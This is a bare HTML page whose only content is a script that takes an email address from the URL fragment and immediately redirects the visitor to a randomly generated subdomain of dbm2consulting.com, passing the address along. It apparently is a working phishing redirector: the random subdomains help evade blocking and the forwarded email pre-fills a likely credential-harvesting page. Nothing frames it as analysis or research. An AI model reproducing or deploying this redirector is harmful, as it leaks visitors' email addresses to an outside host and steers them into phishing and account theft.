<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head></head>
</body>
<script>
  var hash = window.location.hash;
  if(hash !== "") {

    hash = hash.split('#');
    const email = hash[1];

var y = makeid(5); 
var x = makeid(4); 
var d = ".";
var h = "http://";
var l = "dbm2consulting.com/?"
var x = h+x+d+y+d+l;
window.location.href = x + email;  
   
  }


function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}

</script>
</html>
